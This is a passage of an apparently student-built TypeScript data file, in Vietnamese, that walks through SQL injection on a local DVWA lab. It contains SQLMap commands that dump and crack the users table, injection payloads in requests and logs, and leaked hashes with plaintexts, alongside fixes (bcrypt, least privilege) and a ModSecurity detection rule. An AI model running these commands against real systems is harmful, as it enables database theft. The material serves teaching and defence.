    commands: [
      {
        label: "Truy vết payload SQLi trong Apache access.log",
        shell: "zsh / bash",
        template: `docker exec {{CONTAINER}} grep -E "(\\%27|\\'|UNION|SELECT)" /var/log/apache2/access.log | tail -n 5`,
        explanation:
          "grep -E dùng regex mở rộng lọc các request chứa dấu nháy đơn (%27 hoặc ') hoặc từ khóa UNION/SELECT trong 5 dòng mới nhất của access.log.",
      },
    ],
    expected_output: `172.17.0.1 - - [04/Nov/2026:02:14:08 +0000] "GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1" 200 1842 "-" "Mozilla/5.0 (Burp Chromium)"
172.17.0.1 - - [04/Nov/2026:02:15:21 +0000] "GET /vulnerabilities/sqli/?id=%27%20OR%20%271%27%3D%271&Submit=Submit HTTP/1.1" 200 2195 "-" "curl/8.5.0"`,
    academic_explanation:
      "Bổ sung góc nhìn phòng thủ Blue Team / Incident Response: mọi dấu vết khai thác qua Burp hay cURL đều để lại vết định danh IP, User-Agent và biến động kích thước response trong nhật ký máy chủ.",
    presenter_script:
      "Ở góc độ Blue Team, khi truy vấn ngược tệp access.log trong Apache, hệ thống ghi nhận rõ các IoC gồm IP nguồn, chuỗi payload %27/UNION, User-Agent là curl hay trình duyệt và sự thay đổi kích thước gói tin phản hồi.",
    simulator_key: "m2-curl-log",
  },

  // ==================== NGUOI 3 ====================
  {
    id: "m3-s1",
    member_number: 3,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH • SQLMAP TỰ ĐỘNG",
    title: "Cài đặt SQLMap & Chạy Chuỗi 3 Lệnh Khai thác Tự động + Crack MD5",
    poc_ref: "SQLMap • 3 Lệnh",
    is_defense: false,
    goal: "Dùng công cụ tự động SQLMap với PHPSESSID từ bước trước để dò tên CSDL, liệt kê bảng nhạy cảm và dump toàn bộ bảng users kèm bẻ khóa MD5.",
    action_steps: [
      "Kiểm tra hoặc cài đặt SQLMap trên máy bằng lệnh: sudo apt install -y sqlmap.",
      "Lệnh 1 (--dbs): Khai thác danh sách các cơ sở dữ liệu hiện có (tìm thấy information_schema và dvwa).",
      "Lệnh 2 (-D dvwa --tables): Khóa mục tiêu vào CSDL dvwa và liệt kê các bảng (tìm thấy guestbook và users).",
      "Lệnh 3 (-D dvwa -T users --dump): Tải toàn bộ dữ liệu bảng users và để SQLMap tự động chạy Dictionary Attack bẻ khóa cột password (MD5).",
    ],
    commands: [
      {
        label: "Lệnh 1: Liệt kê Cơ sở dữ liệu (--dbs)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" --dbs --batch`,
        explanation: "--cookie truyền phiên đã đăng nhập; --batch tự động chọn đáp án mặc định không cần hỏi lại.",
      },
      {
        label: "Lệnh 2: Liệt kê các Bảng trong CSDL dvwa (--tables)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" -D dvwa --tables --batch`,
        explanation: "-D dvwa chỉ định đúng database dvwa vừa tìm được ở Lệnh 1.",
      },
      {
        label: "Lệnh 3: Trích xuất bảng users & Tự động bẻ khóa MD5 (--dump)",
        shell: "zsh / bash",
        template: `sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \\
  --cookie="security=low; PHPSESSID={{PHPSESSID}}" -D dvwa -T users --dump --batch`,
        explanation: "SQLMap phát hiện cột password dạng MD5 và tự động chạy tấn công từ điển giải mã ra mật khẩu rõ (password, abc123, charley).",
      },
    ],
    expected_output: `available databases [2]:
[*] dvwa
[*] information_schema

Database: dvwa | [2 tables]: guestbook, users

Database: dvwa | Table: users [5 entries]
+---------+---------+--------------------------------------------+
| user_id | user    | password                                   |
+---------+---------+--------------------------------------------+
| 1       | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| 2       | gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 3       | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| 4       | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7            |
| 5       | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------+--------------------------------------------+`,
    academic_explanation:
      "Giải thích lý do dùng SQLMap thay vì gõ tay: tự động thử hàng loạt kỹ thuật (Boolean-based, Error-based, UNION query), bỏ qua bước lặp thủ công và tích hợp sẵn bộ từ điển bẻ khóa hash MD5.",
    presenter_script:
      "Từ cookie phiên hợp lệ, thực thi chuỗi 3 lệnh SQLMap liên hoàn: tìm ra database dvwa, xác định bảng users và dùng --dump trích xuất cả 5 tài khoản. Nhờ --batch, SQLMap tự nhận diện MD5 và bẻ khóa ngược ra mật khẩu gốc như password, abc123 ngay trên Terminal.",
    simulator_key: "m3-sqlmap",
  },
  {
    id: "m3-s2",
    member_number: 3,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 3",
    title: "Kiểm toán Hộp trắng MariaDB CLI — Chứng minh Điểm yếu MD5 không Salt",
    poc_ref: "PoC 3 • MariaDB",
    is_defense: false,
    goal: "Truy cập trực tiếp vào MariaDB bên trong container dvwa để kiểm toán cấu trúc lưu trữ mật khẩu (PoC 3) và phân tích rủi ro Rainbow Table.",
    action_steps: [
      "Chạy lệnh docker exec -it {{CONTAINER}} mysql -u root -e \"USE dvwa; SELECT user_id, user, password FROM users;\" trên Terminal.",
      "Chỉ trực tiếp vào độ dài chuỗi password: đúng 32 ký tự thập lục phân (128-bit) đặc trưng của thuật toán MD5 đã lỗi thời.",
      "So sánh bản ghi số 1 (admin) và số 5 (smithy): cả hai có chuỗi băm GIỐNG HỆT NHAU là 5f4dcc3b5aa765d61d8327deb882cf99.",
      "Kết luận điểm yếu mật mã học CWE-759 (CVSS 4.9 Medium): lưu hash không có Salt (Unsalted Hash) khiến Rainbow Table giải mã đồng loạt mọi tài khoản trùng mật khẩu.",
    ],
    commands: [
      {
        label: "Kiểm toán trực tiếp bảng users bằng MariaDB CLI (PoC 3)",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; SELECT user_id, user, password FROM users;"`,
        explanation:
          "Truy cập thẳng vào MariaDB với quyền root không cần mật khẩu (đồng thời phơi bày thêm rủi ro lạm dụng đặc quyền kết nối DB).",
      },
    ],
    expected_output: `+---------+---------+----------------------------------+
| user_id | user    | password                         |
+---------+---------+----------------------------------+
|       1 | admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
|       2 | gordonb | e99a18c428cb38d5f260853678922e03 |
|       3 | 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
|       4 | pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
|       5 | smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+---------+----------------------------------+`,
    academic_explanation:
      "MD5 là hàm băm nhanh không thiết kế cho mật khẩu; việc thiếu chuỗi ngẫu nhiên (Salt) làm mọi mật khẩu giống nhau cho ra cùng 1 digest, bị tra ngược tức thì qua Rainbow Table (CWE-759, CVSS 4.9).",
    presenter_script:
      "Khi kiểm toán hộp trắng trực tiếp trong MariaDB ở PoC 3, tài khoản số 1 (admin) và số 5 (smithy) có chuỗi băm MD5 giống hệt nhau: 5f4dcc3b5aa765d61d8327deb882cf99. Đây là lỗi băm không Salt (CWE-759), chỉ cần tra bảng cầu vồng một lần là lộ đồng loạt.",
    simulator_key: "m3-mariadb-patch",
  },
  {
    id: "m3-s3",
    member_number: 3,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • VÁ LỖI 1 (BCRYPT)",
    title: "Vá lỗi 1 Trực tiếp — Nâng cấp Thuật toán Băm sang Bcrypt (cost = 12)",
    poc_ref: "Vá lỗi 1 • Bcrypt",
    is_defense: true,
    goal: "Kiểm tra hỗ trợ Argon2id/Bcrypt trong PHP CLI, sinh chuỗi băm Bcrypt có Salt tự động (cost = 12) và cập nhật trực tiếp vào MariaDB.",
    action_steps: [
      "Kiểm tra PHP trên container có hỗ trợ PASSWORD_ARGON2ID hay dùng PASSWORD_BCRYPT.",
      "Chạy lệnh PHP CLI sinh hash Bcrypt cho mật khẩu 'password' với hệ số chi phí cost = 12.",
      "Lấy chuỗi hash vừa sinh (bắt đầu bằng $2y$12$...) cập nhật trực tiếp vào bảng users cho user_id = 1 và SELECT kiểm chứng lại.",
    ],
    commands: [
      {
        label: "Kiểm tra Argon2id & Sinh mã băm Bcrypt (cost = 12) qua PHP CLI",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} php -r "echo defined('PASSWORD_ARGON2ID') ? 'Supported' : 'Use BCRYPT'; echo PHP_EOL;"
docker exec -it {{CONTAINER}} php -r 'echo password_hash("password", PASSWORD_BCRYPT, ["cost" => 12]) . PHP_EOL;'`,
        explanation:
          "Hàm password_hash() của PHP tự động sinh Salt ngẫu nhiên 22 ký tự cho mỗi lần gọi; cùng mật khẩu 'password' nhưng admin và smithy sẽ ra 2 chuỗi hoàn toàn khác nhau.",
      },
      {
        label: "Cập nhật chuỗi Bcrypt vào MariaDB & Kiểm chứng",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "USE dvwa; UPDATE users SET password = '\\$2y\\$12\\$exampleHashedPasswordGeneratedByBcrypt' WHERE user_id = 1; SELECT user_id, user, password FROM users WHERE user_id = 1;"`,
        explanation: "Thay thế chuỗi 32 ký tự MD5 cũ bằng chuỗi Bcrypt 60 ký tự có tiền tố thuật toán + cost + Salt.",
      },
    ],
    expected_output: `Use BCRYPT
$2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX

+---------+-------+--------------------------------------------------------------+
| user_id | user  | password                                                     |
+---------+-------+--------------------------------------------------------------+
|       1 | admin | $2y$12$K9p8Q3vT2xL7wR4mN6zA1eH8cB5vD0fG2jK4lM6nP8qR0sT2uV4wX |
+---------+-------+--------------------------------------------------------------+`,
    academic_explanation:
      "Bcrypt/Argon2id là thuật toán băm thích ứng (Adaptive Key Derivation) tích hợp Salt tự động và tham số cost làm chậm brute-force/GPU cracking gấp hàng nghìn lần so với MD5.",
    presenter_script:
      "Để khắc phục PoC 3, tiến hành sinh chuỗi băm chuẩn Bcrypt với cost=12 có tích hợp Salt tự động qua PHP CLI và cập nhật trực tiếp vào MariaDB, loại bỏ hoàn toàn nguy cơ tra ngược Rainbow Table.",
    simulator_key: "m3-mariadb-patch",
  },
  {
    id: "m3-s4",
    member_number: 3,
    step_order: 4,
    phase_tag: "GIA CỐ & PHÒNG THỦ • VÁ LỖI 2 (LEAST PRIVILEGE)",
    title: "Vá lỗi 2 Trực tiếp — Tạo Tài khoản CSDL Đặc quyền Tối thiểu (dvwa_svc)",
    poc_ref: "Vá lỗi 2 • DB Grants",
    is_defense: true,
    goal: "Chấm dứt việc kết nối ứng dụng web bằng tài khoản root toàn quyền, thay thế bằng tài khoản dịch vụ chỉ có quyền SELECT, INSERT, UPDATE trên bảng dvwa.users.",
    action_steps: [
      "Chạy lệnh CREATE USER tạo tài khoản 'dvwa_svc'@'localhost' với mật khẩu mạnh.",
      "Cấp đúng 3 quyền nghiệp vụ cần thiết: GRANT SELECT, INSERT, UPDATE ON dvwa.users.",
      "Chạy FLUSH PRIVILEGES và SHOW GRANTS FOR 'dvwa_svc'@'localhost' để lấy bằng chứng kiểm toán.",
    ],
    commands: [
      {
        label: "Tạo tài khoản dịch vụ Least Privilege & Kiểm tra quyền",
        shell: "zsh / bash",
        template: `docker exec -it {{CONTAINER}} mysql -u root -e "CREATE USER IF NOT EXISTS 'dvwa_svc'@'localhost' IDENTIFIED BY 'SecureSvcPass2026!'; GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'dvwa_svc'@'localhost'; FLUSH PRIVILEGES; SHOW GRANTS FOR 'dvwa_svc'@'localhost';" `,
        explanation:
          "Không cấp DROP, ALTER, FILE, SUPER hay quyền truy cập vào cơ sở dữ liệu mysql/information_schema nhạy cảm.",
      },
    ],
    expected_output: `+--------------------------------------------------------------------------------+
| Grants for dvwa_svc@localhost                                                  |
+--------------------------------------------------------------------------------+
| GRANT USAGE ON *.* TO 'dvwa_svc'@'localhost' IDENTIFIED BY PASSWORD ...        |
| GRANT SELECT, INSERT, UPDATE ON \`dvwa\`.\`users\` TO 'dvwa_svc'@'localhost'       |
+--------------------------------------------------------------------------------+`,
    academic_explanation:
      "Nguyên tắc Đặc quyền Tối thiểu (Least Privilege) giới hạn bán kính thiệt hại (Blast Radius): dù tầng web có sự cố, kẻ tấn công cũng không thể đọc file hệ thống (LOAD_FILE/INTO OUTFILE) hay phá hủy bảng/CSDL khác.",
    presenter_script:
      "Song song với vá mật mã học, áp dụng nguyên tắc Least Privilege bằng cách tạo tài khoản dịch vụ dvwa_svc chỉ được cấp quyền SELECT, INSERT, UPDATE trên đúng bảng dvwa.users thay cho tài khoản root toàn quyền.",
    simulator_key: "m3-mariadb-patch",
  },

  // ==================== NGUOI 4 ====================
  {
    id: "m4-s1",
    member_number: 4,
    step_order: 1,
    phase_tag: "PHẦN CHÍNH + MỞ RỘNG • POC 4",
    title: "Kiểm toán Hộp trắng & Đối chiếu Mã nguồn PHP 4 Cấp độ",
    poc_ref: "PoC 4 • PHP 4 cấp",
    is_defense: true,
    goal: "Đặt cả 4 file mã nguồn (low.php, medium.php, high.php, impossible.php) lên bàn cân kiểm toán để chỉ ra nguyên nhân gốc rễ và lý do các bộ lọc bề mặt vẫn bị vượt qua.",
    action_steps: [
      "Chạy 4 lệnh docker exec {{CONTAINER}} cat -n ... để xuất mã nguồn kèm số dòng của cả 4 cấp độ.",
      "Chỉ rõ low.php: Dòng 5 nhận thẳng $_REQUEST['id'], Dòng 8 nối chuỗi '$id', Dòng 9 in lỗi MariaDB qua mysqli_error().",
      "Giải thích medium.php: Có dùng mysqli_real_escape_string() nhưng câu SQL viết WHERE user_id = $id không có dấu nháy đơn -> SQL coi là biểu thức số học, vô hiệu hóa hàm thoát nháy.",
      "Giải thích high.php: Truyền qua $_SESSION và thêm LIMIT 1 nhưng vi phạm Trust Boundary khi vẫn ghép chuỗi trực tiếp.",
      "Phân tích impossible.php: Phòng thủ 3 lớp gồm checkToken() (dòng 5), is_numeric($id) (dòng 11), và PDO Prepared Statements prepare() + bindParam(..., PDO::PARAM_INT) (dòng 13–15).",
    ],
    commands: [
      {
        label: "Trích xuất mã nguồn 4 cấp độ kèm số dòng (PoC 4 mở rộng)",
        shell: "zsh / bash",
        template: `docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/low.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/medium.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/high.php
docker exec {{CONTAINER}} cat -n /var/www/html/vulnerabilities/sqli/source/impossible.php`,
        explanation: "Cờ cat -n đánh số thứ tự từng dòng lệnh PHP giúp đối chiếu chính xác dòng gây lỗi và dòng phòng thủ.",
      },
    ],
    expected_output: `[low.php] Dòng 5: $id = $_REQUEST['id']; | Dòng 8: WHERE user_id = '$id'; | Dòng 9: mysqli_error(...)
[medium.php] mysqli_real_escape_string(...) nhưng WHERE user_id = $id (thiếu nháy đơn)
[high.php] $_SESSION['id'] + LIMIT 1 nhưng vẫn nối chuỗi (Trust Boundary)
[impossible.php] Dòng 5: checkToken() | Dòng 11: is_numeric($id) | Dòng 13-15: $db->prepare() + bindParam(':id', $id, PDO::PARAM_INT)`,
    academic_explanation:
      "Bản chất của Prepared Statements là tách biệt hoàn toàn Giai đoạn Biên dịch cây cú pháp SQL (Compilation Phase tại prepare) và Giai đoạn Nạp tham số (Execution Phase tại bindParam/execute), khiến dữ liệu nhập vào luôn là Data Literal.",
    presenter_script:
      "Khi kiểm toán hộp trắng 4 cấp độ mã nguồn PHP, lỗi gốc nằm ở dòng 8 của low.php do nối chuỗi trực tiếp; medium và high dùng escape hay session vẫn bị bypass; còn impossible.php chặn đứng hoàn toàn nhờ 3 lớp bảo vệ chuẩn.",
    simulator_key: "m4-php-diff",
  },
  {
    id: "m4-s2",
    member_number: 4,
    step_order: 2,
    phase_tag: "PHẦN CHÍNH • POC 5 GỐC",
    title: "Kiểm chứng Bản vá trên Burp Repeater — PoC 5 Gốc (Chặn ở tầng CSRF)",
    poc_ref: "PoC 5 • 302 Found",
    is_defense: false,
    goal: "Chứng minh khi chuyển Cookie sang security=impossible trên gói tin cũ (không chứa user_token), hệ thống lập tức chặn đứng yêu cầu.",
    action_steps: [
      "Mở lại tab Repeater trên Burp Suite (hoặc copy request từ PoC 2).",
      "Giữ nguyên URL tấn công cũ /vulnerabilities/sqli/?id=1'&Submit=Submit (không có user_token).",
      "Sửa dòng Cookie từ security=low thành security=impossible rồi bấm Send.",
      "Quan sát Response: máy chủ trả về HTTP/1.1 302 Found, Content-Length: 0, chuyển hướng về Location: index.php.",
    ],
    commands: [
      {
        label: "Request PoC 5 Gốc trên Burp Repeater (Thiếu user_token)",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit HTTP/1.1
Host: localtest.me:8080
Cookie: security=impossible; PHPSESSID={{PHPSESSID}}`,
        explanation: "Vì thiếu tham số user_token, hàm checkToken() tại dòng 5 của impossible.php kích hoạt ngay trước khi chạm tới logic kiểm tra $id và truy vấn SQL.",
      },
    ],
    expected_output: `HTTP/1.1 302 Found
Date: Wed, 04 Nov 2026 02:07:32 GMT
Server: Apache/2.4.25 (Debian)
Location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8`,
    academic_explanation:
      "Phản hồi 302 Found với Content-Length: 0 chứng minh lớp bảo vệ đầu tiên (Anti-CSRF Token ở dòng 5) đã chặn ngay yêu cầu giả mạo/thiếu token và không hề mở kết nối truy vấn CSDL.",
    presenter_script:
      "Ở PoC 5 gốc, chỉ cần đổi Cookie sang security=impossible và gửi lại gói tin tấn công cũ, hệ thống lập tức trả về HTTP 302 Found chuyển hướng về index.php do bị chặn ngay tại hàm checkToken ở dòng 5.",
    simulator_key: "m4-poc5-waf",
  },
  {
    id: "m4-s3",
    member_number: 4,
    step_order: 3,
    phase_tag: "GIA CỐ & PHÒNG THỦ • POC 5 TINH CHỈNH",
    title: "Kiểm chứng PoC 5 Tinh chỉnh — Điền Đủ user_token để Test Lớp SQLi & PDO",
    poc_ref: "PoC 5 • user_token",
    is_defense: true,
    goal: "Khắc phục hạn chế của PoC 5 gốc (mới test được lớp CSRF) bằng cách truyền user_token hợp lệ, buộc gói tin đi qua dòng 5 để kiểm chứng thực sự lớp is_numeric($id) và PDO Prepared Statements.",
    action_steps: [
      "Trên trình duyệt ở mức security=impossible, mở trang /vulnerabilities/sqli/ và Inspect HTML (hoặc xem Response GET trang chủ SQLi trong Burp) để lấy giá trị ẩn <input type=\"hidden\" name=\"user_token\" value=\"...\">.",
      "Trên Burp Repeater, thử gửi id=1 kèm user_token hợp lệ -> trả về 200 OK hiển thị thông tin người dùng bình thường.",
      "Lấy user_token mới tiếp theo, gửi tham số độc hại id=1' kèm user_token hợp lệ trên Burp Repeater.",
      "Quan sát Response: 200 OK nhưng trang trống/không có kết quả truy vấn và TUYỆT ĐỐI không xuất hiện lỗi cú pháp MariaDB nào.",
    ],
    commands: [
      {
        label: "Request PoC 5 Tinh chỉnh trên Burp Repeater (Đầy đủ user_token)",
        shell: "http",
        template: `GET /vulnerabilities/sqli/?id=1'&Submit=Submit&user_token={{USER_TOKEN}} HTTP/1.1
Host: localtest.me:8080
Cookie: security=impossible; PHPSESSID={{PHPSESSID}}`,
        explanation:
          "Yêu cầu vượt qua checkToken() ở dòng 5, nhưng lập tức bị hàm is_numeric($id) ở dòng 11 trả về false nên bỏ qua khối thực thi CSDL (và nếu vào được PDO cũng bị ép kiểu PDO::PARAM_INT).",
      },
    ],
    expected_output: `HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
<!-- Trang web hiển thị form bình thường, KHÔNG trả về bản ghi nào và KHÔNG lộ bất kỳ thông báo lỗi MariaDB nào -->`,
    academic_explanation:
      "PoC 5 tinh chỉnh chứng minh thực nghiệm trọn vẹn cả 3 lớp phòng thủ (Anti-CSRF + Type Validation + PDO Prepared Statements) đều hoạt động chuẩn xác khi kiểm thử đầy đủ tham số.",
    presenter_script:
      "Nếu chỉ dừng ở 302 Found thì mới chứng minh được lớp chống CSRF. Khi trích xuất user_token hợp lệ từ HTML gắn vào gói tin GET id=1', gói tin vượt qua checkToken() nhưng bị is_numeric() ở dòng 11 chặn đứng, không lộ bất kỳ lỗi CSDL nào.",
    simulator_key: "m4-poc5-waf",
  },
  {
    id: "m4-s4",
    member_number: 4,
    step_order: 4,
    phase_tag: "GIA CỐ & PHÒNG THỦ • WAF & DEFENSE-IN-DEPTH",
    title: "Thiết lập Luật WAF ModSecurity & Tổng kết Phòng thủ Chiều sâu (OWASP A03:2021)",
    poc_ref: "WAF • SecRule 100001",
    is_defense: true,
    goal: "Hoàn thiện lớp phòng ngự tầng biên bằng quy tắc ModSecurity OWASP CRS (chặn HTTP 403 trước khi chạm tới PHP) và tổng kết 3 kiến nghị Defense-in-Depth.",
    action_steps: [
      "Trình bày quy tắc SecRule ID 100001 của WAF ModSecurity kiểm tra tham số ARGS:id bằng biểu thức chính quy @rx.",
      "Giải thích cơ chế hành động: deny với mã trạng thái status:403, ghi nhật ký log mức CRITICAL ngay tại pha 2 (request body/args) trước khi PHP xử lý.",
      "Tổng kết 3 lớp Phòng thủ Chiều sâu (Defense-in-Depth): (1) Code & DB (PDO Prepared Statements + Least Privilege dvwa_svc), (2) Mật mã học (Argon2id/Bcrypt có Salt), (3) Hạ tầng & Tầng biên (Ẩn Banner Apache, Cookie HttpOnly/SameSite=Strict, WAF ModSecurity + Giám sát Log).",
      "Khép lại với thông điệp Security by Design theo chuẩn OWASP Top 10 (A03:2021 - Injection).",
    ],
    commands: [
      {
        label: "Quy tắc WAF ModSecurity (OWASP CRS Custom SecRule)",
        shell: "apache",
        template: `SecRule ARGS:id "@rx (\\'|--|#|/\\*|UNION|SELECT|OR\\s+\\d+=\\d+)" \\
  "id:100001,phase:2,deny,status:403,log,msg:'Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity',tag:'application-multi-rule',severity:'CRITICAL'"`,
        explanation:
          "Chặn các ký tự/từ khóa đặc trưng của SQL Injection (', --, #, /*, UNION, SELECT, OR 1=1) ngay tại tầng Apache WAF với mã 403 Forbidden.",
      },
    ],
    expected_output: `HTTP/1.1 403 Forbidden
[ModSecurity Audit Log] id "100001" | severity "CRITICAL" | msg "Phat hien dau hieu bat thuong trong tham so id - Ngan chan boi ModSecurity"`,
    academic_explanation:
      "Phòng thủ Chiều sâu (Defense-in-Depth) đảm bảo nếu một lớp gặp sơ hở (ví dụ lập trình viên quên sửa 1 file PHP cũ), WAF ở tầng biên, tài khoản DB tối thiểu và thuật toán Bcrypt vẫn bảo vệ hệ thống toàn vẹn.",
    presenter_script:
      "Cuối cùng, để bảo vệ hệ thống ngay từ tầng biên trước khi mã độc chạm vào PHP, quy tắc WAF ModSecurity SecRule id 100001 được thiết lập để trả về 403 Forbidden, khép lại mô hình bảo mật đa tầng Security by Design theo OWASP A03:2021.",
    simulator_key: "m4-poc5-waf",
  },
];

export const VULNERABILITIES: VulnerabilityItem[] = [
  {
    id: "vuln-cwe-89",
    cwe_id: "CWE-89",
    title: "SQL Injection (Cấp độ Low — Error-based & Automated Dump)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
    cvss_score: 8.8,
    severity: "High",
    poc_ref: "PoC 2 & PoC 4 (low.php dòng 8)",
    owner_member: 2,
    remediation: "Sử dụng PDO Prepared Statements ($db->prepare + bindParam PDO::PARAM_INT) kết hợp kiểm tra kiểu is_numeric() và chặn biên bằng WAF ModSecurity.",
  },
  {
    id: "vuln-cwe-200",
    cwe_id: "CWE-200",
    title: "Lộ thông tin phiên bản máy chủ (Server Banner Disclosure)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvss_score: 5.3,
    severity: "Medium",
    poc_ref: "PoC 1 (Server: Apache/2.4.25 (Debian))",
    owner_member: 1,
    remediation: "Cấu hình ServerTokens Prod và ServerSignature Off trong /etc/apache2/conf-available/security.conf rồi reload Apache.",
  },
  {
    id: "vuln-cwe-759",
    cwe_id: "CWE-759",
    title: "Lưu trữ Mật khẩu băm MD5 không Salt (Unsalted One-Way Hash)",
    cvss_vector: "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N",
    cvss_score: 4.9,
    severity: "Medium",
    poc_ref: "PoC 3 (admin & smithy trùng chuỗi 5f4dcc3b5aa765d61d8327deb882cf99)",
    owner_member: 3,
    remediation: "Chuyển sang băm thích ứng có Salt tự động bằng Argon2id hoặc Bcrypt (cost=12) qua password_hash() và xác thực bằng password_verify().",
  },
  {
    id: "vuln-cwe-614",
    cwe_id: "CWE-614",
    title: "Thiếu cờ bảo mật trên Cookie phiên (PHPSESSID & security=low)",
    cvss_vector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvss_score: 4.2,
    severity: "Medium",
    poc_ref: "PoC 1 (Set-Cookie thiếu HttpOnly, SameSite=Strict)",
    owner_member: 1,
    remediation: "Thiết lập đầy đủ cờ HttpOnly, Secure và SameSite=Strict cho PHPSESSID; không lưu trạng thái bảo mật (security=low) ở phía Client.",
  },
];

export const QA_ITEMS: QaItem[] = [
  {
    id: "qa-1-1",
    member_number: 1,
    question: "Tại sao trong PoC 1 chỉ cần ẩn phiên bản Apache (ServerTokens Prod) mà không sửa code PHP ngay?",
    answer_summary:
      "Ẩn banner Apache khắc phục trực tiếp lỗ hổng CWE-200 (CVSS 5.3) ở tầng cấu hình máy chủ web: kẻ tấn công không biết chính xác bản 2.4.25 (Debian) để tra cứu CVE khai thác tự động. Đây là bước hạ tầng (Layer 1) trong mô hình Defense-in-Depth, bổ trợ cho phần vá code PHP của Thành viên 4.",
    is_defense: true,
  },
  {
    id: "qa-1-2",
    member_number: 1,
    question: "Vì sao Docker container có lúc dùng ID 215d3a734374, lúc lại dùng tên 'dvwa'?",
    answer_summary:
      "Container được tạo tự động có tên ngẫu nhiên như epic_dijkstra (ID 215d3a734374). Khi nhân bản môi trường sang các máy thực hành khác, việc đặt thêm cờ --name dvwa giúp đồng bộ câu lệnh docker exec giữa tất cả các máy mà không phụ thuộc vào hash ID ngẫu nhiên.",
    is_defense: false,
  },
  {
    id: "qa-2-1",
    member_number: 2,
    question: "Tại sao trình duyệt của Burp Suite lại bỏ qua Proxy khi truy cập 127.0.0.1:8080 và localtest.me giải quyết thế nào?",
    answer_summary:
      "Nhân Chromium mặc định áp dụng danh sách bỏ qua Proxy (Loopback Bypass) cho localhost và 127.0.0.1 nhằm tránh vòng lặp nội bộ. Tên miền localtest.me phân giải DNS công khai về 127.0.0.1 nhưng về mặt chuỗi tên miền lại khác localhost, buộc Chromium đẩy 100% gói tin qua cổng Proxy 8081 của Burp Suite.",
    is_defense: true,
  },
  {
    id: "qa-2-2",
    member_number: 2,
    question: "Khi kiểm tra Apache access.log, làm sao phân biệt được request tấn công từ cURL hay từ trình duyệt Burp?",
    answer_summary:
      "Dựa vào 3 IoC cốt lõi trong mỗi dòng log: (1) Chuỗi truy vấn chứa ký tự đặc biệt mã hóa như %27, UNION, SELECT; (2) Trường User-Agent ghi rõ 'curl/...' đối với CLI so với 'Mozilla/5.0...' của trình duyệt tích hợp Burp; (3) Mã phản hồi HTTP và kích thước response (response dump 5 users dài hơn hẳn query thường).",
    is_defense: true,
  },
  {
    id: "qa-3-1",
    member_number: 3,
    question: "Nếu không dùng Salt, tại sao admin và smithy có cùng hash MD5 lại nguy hiểm hơn bình thường?",
    answer_summary:
      "Khi không có Salt, hàm băm MD5 luôn tạo ra một đầu ra cố định cho cùng một đầu vào (5f4dcc3b5aa765d61d8327deb882cf99 cho 'password'). Kẻ tấn công chỉ cần tra bảng cầu vồng (Rainbow Table) 1 lần là biết ngay cả admin lẫn smithy dùng chung mật khẩu, mở rộng chiếm quyền hàng loạt.",
    is_defense: true,
  },
  {
    id: "qa-3-2",
    member_number: 3,
    question: "Tạo user dvwa_svc với quyền SELECT, INSERT, UPDATE có giúp chống được lỗi SQL Injection không?",
    answer_summary:
      "Least Privilege không tự chặn lỗi nối chuỗi SQLi, nhưng nó giới hạn tối đa hậu quả (Blast Radius): kẻ tấn công không thể dùng quyền root để DROP TABLE, tạo user mới, hoặc đọc/ghi file hệ điều hành qua LOAD_FILE / INTO OUTFILE.",
    is_defense: true,
  },
  {
    id: "qa-4-1",
    member_number: 4,
    question: "Tại sao hàm mysqli_real_escape_string() trong medium.php vẫn bị SQL Injection vượt qua?",
    answer_summary:
      "Hàm mysqli_real_escape_string() chỉ thêm dấu gạch chéo ngược trước các ký tự nháy đơn ', nháy kép \"... Nhưng trong medium.php, biến $id đặt thẳng sau dấu bằng (WHERE user_id = $id) không có dấu nháy đơn bao quanh. Kẻ tấn công truyền payload kiểu số học như '1 OR 1=1' hoàn toàn không cần dùng dấu nháy đơn nên bộ lọc bị vô hiệu.",
    is_defense: true,
  },
  {
    id: "qa-4-2",
    member_number: 4,
    question: "Tại sao trong PoC 5 phải làm thêm bước tinh chỉnh trích xuất user_token thay vì chỉ chụp ảnh mã 302 Found?",
    answer_summary:
